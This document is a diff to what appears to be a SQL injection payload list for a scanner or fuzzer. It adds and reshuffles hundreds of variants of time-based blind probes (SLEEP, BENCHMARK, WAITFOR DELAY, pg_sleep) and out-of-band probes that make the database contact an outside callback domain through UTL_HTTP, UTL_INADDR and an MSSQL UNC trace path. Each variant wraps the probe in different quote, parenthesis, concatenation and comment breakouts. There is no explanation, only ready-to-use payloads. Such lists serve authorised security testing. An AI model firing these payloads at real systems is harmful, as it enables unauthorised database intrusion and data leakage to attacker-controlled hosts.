@@ -6,70 +6,214 @@
 +UTL_INADDR.get_host_name('10.0.0.1')
 +UTL_INADDR.get_host_address('oracle1.5696d8f4.bzn.pw')
 +UTL_HTTP.REQUEST('http://oracle2.5696d8f4.bzn.pw')
-+BENCHMARK(1000000,MD5('A'))   -- 
-+BENCHMARK(1000000,MD5('A'))  /* 
-+BENCHMARK(1000000,MD5('A')))   -- 
-+BENCHMARK(1000000,MD5('A')))  /* 
-+BENCHMARK(1000000,MD5('A'))))   -- 
-+BENCHMARK(1000000,MD5('A'))))  /* 
+||BENCHMARK(1000000,MD5('A'))
+||SLEEP(10)
+||WAITFOR DELAY '00:00:10'
+||(select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default))
+||pg_sleep(10) is not null
+||UTL_INADDR.get_host_name('10.0.0.1')
+||UTL_INADDR.get_host_address('oracle1.5696d8f4.bzn.pw')
+||UTL_HTTP.REQUEST('http://oracle2.5696d8f4.bzn.pw')
+ and BENCHMARK(1000000,MD5('A'))
+ and SLEEP(10)
+ and WAITFOR DELAY '00:00:10'
+ and (select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default))
+ and pg_sleep(10) is not null
+ and UTL_INADDR.get_host_name('10.0.0.1')
+ and UTL_INADDR.get_host_address('oracle1.5696d8f4.bzn.pw')
+ and UTL_HTTP.REQUEST('http://oracle2.5696d8f4.bzn.pw')
++BENCHMARK(1000000,MD5('A'))  -- 
++BENCHMARK(1000000,MD5('A')) /* 
++BENCHMARK(1000000,MD5('A')))  -- 
++BENCHMARK(1000000,MD5('A'))) /* 
++BENCHMARK(1000000,MD5('A'))))  -- 
++BENCHMARK(1000000,MD5('A')))) /* 
 +BENCHMARK(1000000,MD5('A')))))  -- 
 +BENCHMARK(1000000,MD5('A'))))) /* 
-+SLEEP(10)   -- 
-+SLEEP(10)  /* 
-+SLEEP(10))   -- 
-+SLEEP(10))  /* 
-+SLEEP(10)))   -- 
-+SLEEP(10)))  /* 
++SLEEP(10)  -- 
++SLEEP(10) /* 
++SLEEP(10))  -- 
++SLEEP(10)) /* 
++SLEEP(10)))  -- 
++SLEEP(10))) /* 
 +SLEEP(10))))  -- 
 +SLEEP(10)))) /* 
-+WAITFOR DELAY '00:00:10'   -- 
-+WAITFOR DELAY '00:00:10'  /* 
-+WAITFOR DELAY '00:00:10')   -- 
-+WAITFOR DELAY '00:00:10')  /* 
-+WAITFOR DELAY '00:00:10'))   -- 
-+WAITFOR DELAY '00:00:10'))  /* 
++WAITFOR DELAY '00:00:10'  -- 
++WAITFOR DELAY '00:00:10' /* 
++WAITFOR DELAY '00:00:10')  -- 
++WAITFOR DELAY '00:00:10') /* 
++WAITFOR DELAY '00:00:10'))  -- 
++WAITFOR DELAY '00:00:10')) /* 
 +WAITFOR DELAY '00:00:10')))  -- 
 +WAITFOR DELAY '00:00:10'))) /* 
-+(select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default))   -- 
-+(select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default))  /* 
-+(select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default)))   -- 
-+(select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default)))  /* 
-+(select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default))))   -- 
-+(select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default))))  /* 
++(select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default))  -- 
++(select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default)) /* 
++(select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default)))  -- 
++(select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default))) /* 
++(select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default))))  -- 
++(select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default)))) /* 
 +(select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default)))))  -- 
 +(select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default))))) /* 
-+pg_sleep(10) is not null   -- 
-+pg_sleep(10) is not null  /* 
-+pg_sleep(10) is not null)   -- 
-+pg_sleep(10) is not null)  /* 
-+pg_sleep(10) is not null))   -- 
-+pg_sleep(10) is not null))  /* 
++pg_sleep(10) is not null  -- 
++pg_sleep(10) is not null /* 
++pg_sleep(10) is not null)  -- 
++pg_sleep(10) is not null) /* 
++pg_sleep(10) is not null))  -- 
++pg_sleep(10) is not null)) /* 
 +pg_sleep(10) is not null)))  -- 
 +pg_sleep(10) is not null))) /* 
-+UTL_INADDR.get_host_name('10.0.0.1')   -- 
-+UTL_INADDR.get_host_name('10.0.0.1')  /* 
-+UTL_INADDR.get_host_name('10.0.0.1'))   -- 
-+UTL_INADDR.get_host_name('10.0.0.1'))  /* 
-+UTL_INADDR.get_host_name('10.0.0.1')))   -- 
-+UTL_INADDR.get_host_name('10.0.0.1')))  /* 
++UTL_INADDR.get_host_name('10.0.0.1')  -- 
++UTL_INADDR.get_host_name('10.0.0.1') /* 
++UTL_INADDR.get_host_name('10.0.0.1'))  -- 
++UTL_INADDR.get_host_name('10.0.0.1')) /* 
++UTL_INADDR.get_host_name('10.0.0.1')))  -- 
++UTL_INADDR.get_host_name('10.0.0.1'))) /* 
 +UTL_INADDR.get_host_name('10.0.0.1'))))  -- 
 +UTL_INADDR.get_host_name('10.0.0.1')))) /* 
-+UTL_INADDR.get_host_address('oracle1.5696d8f4.bzn.pw')   -- 
-+UTL_INADDR.get_host_address('oracle1.5696d8f4.bzn.pw')  /* 
-+UTL_INADDR.get_host_address('oracle1.5696d8f4.bzn.pw'))   -- 
-+UTL_INADDR.get_host_address('oracle1.5696d8f4.bzn.pw'))  /* 
-+UTL_INADDR.get_host_address('oracle1.5696d8f4.bzn.pw')))   -- 
-+UTL_INADDR.get_host_address('oracle1.5696d8f4.bzn.pw')))  /* 
++UTL_INADDR.get_host_address('oracle1.5696d8f4.bzn.pw')  -- 
++UTL_INADDR.get_host_address('oracle1.5696d8f4.bzn.pw') /* 
++UTL_INADDR.get_host_address('oracle1.5696d8f4.bzn.pw'))  -- 
++UTL_INADDR.get_host_address('oracle1.5696d8f4.bzn.pw')) /* 
++UTL_INADDR.get_host_address('oracle1.5696d8f4.bzn.pw')))  -- 
++UTL_INADDR.get_host_address('oracle1.5696d8f4.bzn.pw'))) /* 
 +UTL_INADDR.get_host_address('oracle1.5696d8f4.bzn.pw'))))  -- 
 +UTL_INADDR.get_host_address('oracle1.5696d8f4.bzn.pw')))) /* 
-+UTL_HTTP.REQUEST('http://oracle2.5696d8f4.bzn.pw')   -- 
-+UTL_HTTP.REQUEST('http://oracle2.5696d8f4.bzn.pw')  /* 
-+UTL_HTTP.REQUEST('http://oracle2.5696d8f4.bzn.pw'))   -- 
-+UTL_HTTP.REQUEST('http://oracle2.5696d8f4.bzn.pw'))  /* 
-+UTL_HTTP.REQUEST('http://oracle2.5696d8f4.bzn.pw')))   -- 
-+UTL_HTTP.REQUEST('http://oracle2.5696d8f4.bzn.pw')))  /* 
++UTL_HTTP.REQUEST('http://oracle2.5696d8f4.bzn.pw')  -- 
++UTL_HTTP.REQUEST('http://oracle2.5696d8f4.bzn.pw') /* 
++UTL_HTTP.REQUEST('http://oracle2.5696d8f4.bzn.pw'))  -- 
++UTL_HTTP.REQUEST('http://oracle2.5696d8f4.bzn.pw')) /* 
++UTL_HTTP.REQUEST('http://oracle2.5696d8f4.bzn.pw')))  -- 
++UTL_HTTP.REQUEST('http://oracle2.5696d8f4.bzn.pw'))) /* 
 +UTL_HTTP.REQUEST('http://oracle2.5696d8f4.bzn.pw'))))  -- 
 +UTL_HTTP.REQUEST('http://oracle2.5696d8f4.bzn.pw')))) /* 
+||BENCHMARK(1000000,MD5('A'))  -- 
+||BENCHMARK(1000000,MD5('A')) /* 
+||BENCHMARK(1000000,MD5('A')))  -- 
+||BENCHMARK(1000000,MD5('A'))) /* 
+||BENCHMARK(1000000,MD5('A'))))  -- 
+||BENCHMARK(1000000,MD5('A')))) /* 
+||BENCHMARK(1000000,MD5('A')))))  -- 
+||BENCHMARK(1000000,MD5('A'))))) /* 
+||SLEEP(10)  -- 
+||SLEEP(10) /* 
+||SLEEP(10))  -- 
+||SLEEP(10)) /* 
+||SLEEP(10)))  -- 
+||SLEEP(10))) /* 
+||SLEEP(10))))  -- 
+||SLEEP(10)))) /* 
+||WAITFOR DELAY '00:00:10'  -- 
+||WAITFOR DELAY '00:00:10' /* 
+||WAITFOR DELAY '00:00:10')  -- 
+||WAITFOR DELAY '00:00:10') /* 
+||WAITFOR DELAY '00:00:10'))  -- 
+||WAITFOR DELAY '00:00:10')) /* 
+||WAITFOR DELAY '00:00:10')))  -- 
+||WAITFOR DELAY '00:00:10'))) /* 
+||(select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default))  -- 
+||(select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default)) /* 
+||(select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default)))  -- 
+||(select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default))) /* 
+||(select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default))))  -- 
+||(select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default)))) /* 
+||(select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default)))))  -- 
+||(select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default))))) /* 
+||pg_sleep(10) is not null  -- 
+||pg_sleep(10) is not null /* 
+||pg_sleep(10) is not null)  -- 
+||pg_sleep(10) is not null) /* 
+||pg_sleep(10) is not null))  -- 
+||pg_sleep(10) is not null)) /* 
+||pg_sleep(10) is not null)))  -- 
+||pg_sleep(10) is not null))) /* 
+||UTL_INADDR.get_host_name('10.0.0.1')  -- 
+||UTL_INADDR.get_host_name('10.0.0.1') /* 
+||UTL_INADDR.get_host_name('10.0.0.1'))  -- 
+||UTL_INADDR.get_host_name('10.0.0.1')) /* 
+||UTL_INADDR.get_host_name('10.0.0.1')))  -- 
+||UTL_INADDR.get_host_name('10.0.0.1'))) /* 
+||UTL_INADDR.get_host_name('10.0.0.1'))))  -- 
+||UTL_INADDR.get_host_name('10.0.0.1')))) /* 
+||UTL_INADDR.get_host_address('oracle1.5696d8f4.bzn.pw')  -- 
+||UTL_INADDR.get_host_address('oracle1.5696d8f4.bzn.pw') /* 
+||UTL_INADDR.get_host_address('oracle1.5696d8f4.bzn.pw'))  -- 
+||UTL_INADDR.get_host_address('oracle1.5696d8f4.bzn.pw')) /* 
+||UTL_INADDR.get_host_address('oracle1.5696d8f4.bzn.pw')))  -- 
+||UTL_INADDR.get_host_address('oracle1.5696d8f4.bzn.pw'))) /* 
+||UTL_INADDR.get_host_address('oracle1.5696d8f4.bzn.pw'))))  -- 
+||UTL_INADDR.get_host_address('oracle1.5696d8f4.bzn.pw')))) /* 
+||UTL_HTTP.REQUEST('http://oracle2.5696d8f4.bzn.pw')  -- 
+||UTL_HTTP.REQUEST('http://oracle2.5696d8f4.bzn.pw') /* 
+||UTL_HTTP.REQUEST('http://oracle2.5696d8f4.bzn.pw'))  -- 
+||UTL_HTTP.REQUEST('http://oracle2.5696d8f4.bzn.pw')) /* 
+||UTL_HTTP.REQUEST('http://oracle2.5696d8f4.bzn.pw')))  -- 
+||UTL_HTTP.REQUEST('http://oracle2.5696d8f4.bzn.pw'))) /* 
+||UTL_HTTP.REQUEST('http://oracle2.5696d8f4.bzn.pw'))))  -- 
+||UTL_HTTP.REQUEST('http://oracle2.5696d8f4.bzn.pw')))) /* 
+ and BENCHMARK(1000000,MD5('A'))  -- 
+ and BENCHMARK(1000000,MD5('A')) /* 
+ and BENCHMARK(1000000,MD5('A')))  -- 
+ and BENCHMARK(1000000,MD5('A'))) /* 
+ and BENCHMARK(1000000,MD5('A'))))  -- 
+ and BENCHMARK(1000000,MD5('A')))) /* 
+ and BENCHMARK(1000000,MD5('A')))))  -- 
+ and BENCHMARK(1000000,MD5('A'))))) /* 
+ and SLEEP(10)  -- 
+ and SLEEP(10) /* 
+ and SLEEP(10))  -- 
+ and SLEEP(10)) /* 
+ and SLEEP(10)))  -- 
+ and SLEEP(10))) /* 
+ and SLEEP(10))))  -- 
+ and SLEEP(10)))) /* 
+ and WAITFOR DELAY '00:00:10'  -- 
+ and WAITFOR DELAY '00:00:10' /* 
+ and WAITFOR DELAY '00:00:10')  -- 
+ and WAITFOR DELAY '00:00:10') /* 
+ and WAITFOR DELAY '00:00:10'))  -- 
+ and WAITFOR DELAY '00:00:10')) /* 
+ and WAITFOR DELAY '00:00:10')))  -- 
+ and WAITFOR DELAY '00:00:10'))) /* 
+ and (select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default))  -- 
+ and (select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default)) /* 
+ and (select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default)))  -- 
+ and (select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default))) /* 
+ and (select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default))))  -- 
+ and (select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default)))) /* 
+ and (select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default)))))  -- 
+ and (select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default))))) /* 
+ and pg_sleep(10) is not null  -- 
+ and pg_sleep(10) is not null /* 
+ and pg_sleep(10) is not null)  -- 
+ and pg_sleep(10) is not null) /* 
+ and pg_sleep(10) is not null))  -- 
+ and pg_sleep(10) is not null)) /* 
+ and pg_sleep(10) is not null)))  -- 
+ and pg_sleep(10) is not null))) /* 
+ and UTL_INADDR.get_host_name('10.0.0.1')  -- 
+ and UTL_INADDR.get_host_name('10.0.0.1') /* 
+ and UTL_INADDR.get_host_name('10.0.0.1'))  -- 
+ and UTL_INADDR.get_host_name('10.0.0.1')) /* 
+ and UTL_INADDR.get_host_name('10.0.0.1')))  -- 
+ and UTL_INADDR.get_host_name('10.0.0.1'))) /* 
+ and UTL_INADDR.get_host_name('10.0.0.1'))))  -- 
+ and UTL_INADDR.get_host_name('10.0.0.1')))) /* 
+ and UTL_INADDR.get_host_address('oracle1.5696d8f4.bzn.pw')  -- 
+ and UTL_INADDR.get_host_address('oracle1.5696d8f4.bzn.pw') /* 
+ and UTL_INADDR.get_host_address('oracle1.5696d8f4.bzn.pw'))  -- 
+ and UTL_INADDR.get_host_address('oracle1.5696d8f4.bzn.pw')) /* 
+ and UTL_INADDR.get_host_address('oracle1.5696d8f4.bzn.pw')))  -- 
+ and UTL_INADDR.get_host_address('oracle1.5696d8f4.bzn.pw'))) /* 
+ and UTL_INADDR.get_host_address('oracle1.5696d8f4.bzn.pw'))))  -- 
+ and UTL_INADDR.get_host_address('oracle1.5696d8f4.bzn.pw')))) /* 
+ and UTL_HTTP.REQUEST('http://oracle2.5696d8f4.bzn.pw')  -- 
+ and UTL_HTTP.REQUEST('http://oracle2.5696d8f4.bzn.pw') /* 
+ and UTL_HTTP.REQUEST('http://oracle2.5696d8f4.bzn.pw'))  -- 
+ and UTL_HTTP.REQUEST('http://oracle2.5696d8f4.bzn.pw')) /* 
+ and UTL_HTTP.REQUEST('http://oracle2.5696d8f4.bzn.pw')))  -- 
+ and UTL_HTTP.REQUEST('http://oracle2.5696d8f4.bzn.pw'))) /* 
+ and UTL_HTTP.REQUEST('http://oracle2.5696d8f4.bzn.pw'))))  -- 
+ and UTL_HTTP.REQUEST('http://oracle2.5696d8f4.bzn.pw')))) /* 
 '+BENCHMARK(1000000,MD5('A'))+'a
 '+SLEEP(10)+'a
 '+WAITFOR DELAY '00:00:10'+'a
@@ -78,78 +222,22 @@
 '+UTL_INADDR.get_host_name('10.0.0.1')+'a
 '+UTL_INADDR.get_host_address('oracle1.5696d8f4.bzn.pw')+'a
 '+UTL_HTTP.REQUEST('http://oracle2.5696d8f4.bzn.pw')+'a
-')+BENCHMARK(1000000,MD5('A'))+('a
-')+SLEEP(10)+('a
-')+WAITFOR DELAY '00:00:10'+('a
-')+(select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default))+('a
-')+pg_sleep(10) is not null+('a
-')+UTL_INADDR.get_host_name('10.0.0.1')+('a
-')+UTL_INADDR.get_host_address('oracle1.5696d8f4.bzn.pw')+('a
-')+UTL_HTTP.REQUEST('http://oracle2.5696d8f4.bzn.pw')+('a
-'+BENCHMARK(1000000,MD5('A'))   -- 
-'+BENCHMARK(1000000,MD5('A'))  /* 
-'+BENCHMARK(1000000,MD5('A')))   -- 
-'+BENCHMARK(1000000,MD5('A')))  /* 
-'+BENCHMARK(1000000,MD5('A'))))   -- 
-'+BENCHMARK(1000000,MD5('A'))))  /* 
-'+BENCHMARK(1000000,MD5('A')))))  -- 
-'+BENCHMARK(1000000,MD5('A'))))) /* 
-'+SLEEP(10)   -- 
-'+SLEEP(10)  /* 
-'+SLEEP(10))   -- 
-'+SLEEP(10))  /* 
-'+SLEEP(10)))   -- 
-'+SLEEP(10)))  /* 
-'+SLEEP(10))))  -- 
-'+SLEEP(10)))) /* 
-'+WAITFOR DELAY '00:00:10'   -- 
-'+WAITFOR DELAY '00:00:10'  /* 
-'+WAITFOR DELAY '00:00:10')   -- 
-'+WAITFOR DELAY '00:00:10')  /* 
-'+WAITFOR DELAY '00:00:10'))   -- 
-'+WAITFOR DELAY '00:00:10'))  /* 
-'+WAITFOR DELAY '00:00:10')))  -- 
-'+WAITFOR DELAY '00:00:10'))) /* 
-'+(select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default))   -- 
-'+(select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default))  /* 
-'+(select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default)))   -- 
-'+(select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default)))  /* 
-'+(select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default))))   -- 
-'+(select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default))))  /* 
-'+(select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default)))))  -- 
-'+(select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default))))) /* 
-'+pg_sleep(10) is not null   -- 
-'+pg_sleep(10) is not null  /* 
-'+pg_sleep(10) is not null)   -- 
-'+pg_sleep(10) is not null)  /* 
-'+pg_sleep(10) is not null))   -- 
-'+pg_sleep(10) is not null))  /* 
-'+pg_sleep(10) is not null)))  -- 
-'+pg_sleep(10) is not null))) /* 
-'+UTL_INADDR.get_host_name('10.0.0.1')   -- 
-'+UTL_INADDR.get_host_name('10.0.0.1')  /* 
-'+UTL_INADDR.get_host_name('10.0.0.1'))   -- 
-'+UTL_INADDR.get_host_name('10.0.0.1'))  /* 
-'+UTL_INADDR.get_host_name('10.0.0.1')))   -- 
-'+UTL_INADDR.get_host_name('10.0.0.1')))  /* 
-'+UTL_INADDR.get_host_name('10.0.0.1'))))  -- 
-'+UTL_INADDR.get_host_name('10.0.0.1')))) /* 
-'+UTL_INADDR.get_host_address('oracle1.5696d8f4.bzn.pw')   -- 
-'+UTL_INADDR.get_host_address('oracle1.5696d8f4.bzn.pw')  /* 
-'+UTL_INADDR.get_host_address('oracle1.5696d8f4.bzn.pw'))   -- 
-'+UTL_INADDR.get_host_address('oracle1.5696d8f4.bzn.pw'))  /* 
-'+UTL_INADDR.get_host_address('oracle1.5696d8f4.bzn.pw')))   -- 
-'+UTL_INADDR.get_host_address('oracle1.5696d8f4.bzn.pw')))  /* 
-'+UTL_INADDR.get_host_address('oracle1.5696d8f4.bzn.pw'))))  -- 
-'+UTL_INADDR.get_host_address('oracle1.5696d8f4.bzn.pw')))) /* 
-'+UTL_HTTP.REQUEST('http://oracle2.5696d8f4.bzn.pw')   -- 
-'+UTL_HTTP.REQUEST('http://oracle2.5696d8f4.bzn.pw')  /* 
-'+UTL_HTTP.REQUEST('http://oracle2.5696d8f4.bzn.pw'))   -- 
-'+UTL_HTTP.REQUEST('http://oracle2.5696d8f4.bzn.pw'))  /* 
-'+UTL_HTTP.REQUEST('http://oracle2.5696d8f4.bzn.pw')))   -- 
-'+UTL_HTTP.REQUEST('http://oracle2.5696d8f4.bzn.pw')))  /* 
-'+UTL_HTTP.REQUEST('http://oracle2.5696d8f4.bzn.pw'))))  -- 
-'+UTL_HTTP.REQUEST('http://oracle2.5696d8f4.bzn.pw')))) /* 
+'||BENCHMARK(1000000,MD5('A'))||'a
+'||SLEEP(10)||'a
+'||WAITFOR DELAY '00:00:10'||'a
+'||(select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default))||'a
+'||pg_sleep(10) is not null||'a
+'||UTL_INADDR.get_host_name('10.0.0.1')||'a
+'||UTL_INADDR.get_host_address('oracle1.5696d8f4.bzn.pw')||'a
+'||UTL_HTTP.REQUEST('http://oracle2.5696d8f4.bzn.pw')||'a
+' and BENCHMARK(1000000,MD5('A')) and 'a
+' and SLEEP(10) and 'a
+' and WAITFOR DELAY '00:00:10' and 'a
+' and (select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default)) and 'a
+' and pg_sleep(10) is not null and 'a
+' and UTL_INADDR.get_host_name('10.0.0.1') and 'a
+' and UTL_INADDR.get_host_address('oracle1.5696d8f4.bzn.pw') and 'a
+' and UTL_HTTP.REQUEST('http://oracle2.5696d8f4.bzn.pw') and 'a
 "+BENCHMARK(1000000,MD5('A'))+"a
 "+SLEEP(10)+"a
 "+WAITFOR DELAY '00:00:10'+"a
@@ -158,6 +246,46 @@
 "+UTL_INADDR.get_host_name('10.0.0.1')+"a
 "+UTL_INADDR.get_host_address('oracle1.5696d8f4.bzn.pw')+"a
 "+UTL_HTTP.REQUEST('http://oracle2.5696d8f4.bzn.pw')+"a
+"||BENCHMARK(1000000,MD5('A'))||"a
+"||SLEEP(10)||"a
+"||WAITFOR DELAY '00:00:10'||"a
+"||(select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default))||"a
+"||pg_sleep(10) is not null||"a
+"||UTL_INADDR.get_host_name('10.0.0.1')||"a
+"||UTL_INADDR.get_host_address('oracle1.5696d8f4.bzn.pw')||"a
+"||UTL_HTTP.REQUEST('http://oracle2.5696d8f4.bzn.pw')||"a
+" and BENCHMARK(1000000,MD5('A')) and "a
+" and SLEEP(10) and "a
+" and WAITFOR DELAY '00:00:10' and "a
+" and (select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default)) and "a
+" and pg_sleep(10) is not null and "a
+" and UTL_INADDR.get_host_name('10.0.0.1') and "a
+" and UTL_INADDR.get_host_address('oracle1.5696d8f4.bzn.pw') and "a
+" and UTL_HTTP.REQUEST('http://oracle2.5696d8f4.bzn.pw') and "a
+')+BENCHMARK(1000000,MD5('A'))+('a
+')+SLEEP(10)+('a
+')+WAITFOR DELAY '00:00:10'+('a
+')+(select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default))+('a
+')+pg_sleep(10) is not null+('a
+')+UTL_INADDR.get_host_name('10.0.0.1')+('a
+')+UTL_INADDR.get_host_address('oracle1.5696d8f4.bzn.pw')+('a
+')+UTL_HTTP.REQUEST('http://oracle2.5696d8f4.bzn.pw')+('a
+')||BENCHMARK(1000000,MD5('A'))||('a
+')||SLEEP(10)||('a
+')||WAITFOR DELAY '00:00:10'||('a
+')||(select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default))||('a
+')||pg_sleep(10) is not null||('a
+')||UTL_INADDR.get_host_name('10.0.0.1')||('a
+')||UTL_INADDR.get_host_address('oracle1.5696d8f4.bzn.pw')||('a
+')||UTL_HTTP.REQUEST('http://oracle2.5696d8f4.bzn.pw')||('a
+') and BENCHMARK(1000000,MD5('A')) and ('a
+') and SLEEP(10) and ('a
+') and WAITFOR DELAY '00:00:10' and ('a
+') and (select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default)) and ('a
+') and pg_sleep(10) is not null and ('a
+') and UTL_INADDR.get_host_name('10.0.0.1') and ('a
+') and UTL_INADDR.get_host_address('oracle1.5696d8f4.bzn.pw') and ('a
+') and UTL_HTTP.REQUEST('http://oracle2.5696d8f4.bzn.pw') and ('a
 ")+BENCHMARK(1000000,MD5('A'))+("a
 ")+SLEEP(10)+("a
 ")+WAITFOR DELAY '00:00:10'+("a
@@ -166,70 +294,406 @@
 ")+UTL_INADDR.get_host_name('10.0.0.1')+("a
 ")+UTL_INADDR.get_host_address('oracle1.5696d8f4.bzn.pw')+("a
 ")+UTL_HTTP.REQUEST('http://oracle2.5696d8f4.bzn.pw')+("a
-"+BENCHMARK(1000000,MD5('A'))   -- 
-"+BENCHMARK(1000000,MD5('A'))  /* 
-"+BENCHMARK(1000000,MD5('A')))   -- 
-"+BENCHMARK(1000000,MD5('A')))  /* 
-"+BENCHMARK(1000000,MD5('A'))))   -- 
-"+BENCHMARK(1000000,MD5('A'))))  /* 
+")||BENCHMARK(1000000,MD5('A'))||("a
+")||SLEEP(10)||("a
+")||WAITFOR DELAY '00:00:10'||("a
+")||(select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default))||("a
+")||pg_sleep(10) is not null||("a
+")||UTL_INADDR.get_host_name('10.0.0.1')||("a
+")||UTL_INADDR.get_host_address('oracle1.5696d8f4.bzn.pw')||("a
+")||UTL_HTTP.REQUEST('http://oracle2.5696d8f4.bzn.pw')||("a
+") and BENCHMARK(1000000,MD5('A')) and ("a
+") and SLEEP(10) and ("a
+") and WAITFOR DELAY '00:00:10' and ("a
+") and (select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default)) and ("a
+") and pg_sleep(10) is not null and ("a
+") and UTL_INADDR.get_host_name('10.0.0.1') and ("a
+") and UTL_INADDR.get_host_address('oracle1.5696d8f4.bzn.pw') and ("a
+") and UTL_HTTP.REQUEST('http://oracle2.5696d8f4.bzn.pw') and ("a
+'+BENCHMARK(1000000,MD5('A'))  -- 
+'+BENCHMARK(1000000,MD5('A')) /* 
+'+BENCHMARK(1000000,MD5('A')))  -- 
+'+BENCHMARK(1000000,MD5('A'))) /* 
+'+BENCHMARK(1000000,MD5('A'))))  -- 
+'+BENCHMARK(1000000,MD5('A')))) /* 
+'+BENCHMARK(1000000,MD5('A')))))  -- 
+'+BENCHMARK(1000000,MD5('A'))))) /* 
+'+SLEEP(10)  -- 
+'+SLEEP(10) /* 
+'+SLEEP(10))  -- 
+'+SLEEP(10)) /* 
+'+SLEEP(10)))  -- 
+'+SLEEP(10))) /* 
+'+SLEEP(10))))  -- 
+'+SLEEP(10)))) /* 
+'+WAITFOR DELAY '00:00:10'  -- 
+'+WAITFOR DELAY '00:00:10' /* 
+'+WAITFOR DELAY '00:00:10')  -- 
+'+WAITFOR DELAY '00:00:10') /* 
+'+WAITFOR DELAY '00:00:10'))  -- 
+'+WAITFOR DELAY '00:00:10')) /* 
+'+WAITFOR DELAY '00:00:10')))  -- 
+'+WAITFOR DELAY '00:00:10'))) /* 
+'+(select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default))  -- 
+'+(select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default)) /* 
+'+(select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default)))  -- 
+'+(select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default))) /* 
+'+(select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default))))  -- 
+'+(select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default)))) /* 
+'+(select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default)))))  -- 
+'+(select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default))))) /* 
+'+pg_sleep(10) is not null  -- 
+'+pg_sleep(10) is not null /* 
+'+pg_sleep(10) is not null)  -- 
+'+pg_sleep(10) is not null) /* 
+'+pg_sleep(10) is not null))  -- 
+'+pg_sleep(10) is not null)) /* 
+'+pg_sleep(10) is not null)))  -- 
+'+pg_sleep(10) is not null))) /* 
+'+UTL_INADDR.get_host_name('10.0.0.1')  -- 
+'+UTL_INADDR.get_host_name('10.0.0.1') /* 
+'+UTL_INADDR.get_host_name('10.0.0.1'))  -- 
+'+UTL_INADDR.get_host_name('10.0.0.1')) /* 
+'+UTL_INADDR.get_host_name('10.0.0.1')))  -- 
+'+UTL_INADDR.get_host_name('10.0.0.1'))) /* 
+'+UTL_INADDR.get_host_name('10.0.0.1'))))  -- 
+'+UTL_INADDR.get_host_name('10.0.0.1')))) /* 
+'+UTL_INADDR.get_host_address('oracle1.5696d8f4.bzn.pw')  -- 
+'+UTL_INADDR.get_host_address('oracle1.5696d8f4.bzn.pw') /* 
+'+UTL_INADDR.get_host_address('oracle1.5696d8f4.bzn.pw'))  -- 
+'+UTL_INADDR.get_host_address('oracle1.5696d8f4.bzn.pw')) /* 
+'+UTL_INADDR.get_host_address('oracle1.5696d8f4.bzn.pw')))  -- 
+'+UTL_INADDR.get_host_address('oracle1.5696d8f4.bzn.pw'))) /* 
+'+UTL_INADDR.get_host_address('oracle1.5696d8f4.bzn.pw'))))  -- 
+'+UTL_INADDR.get_host_address('oracle1.5696d8f4.bzn.pw')))) /* 
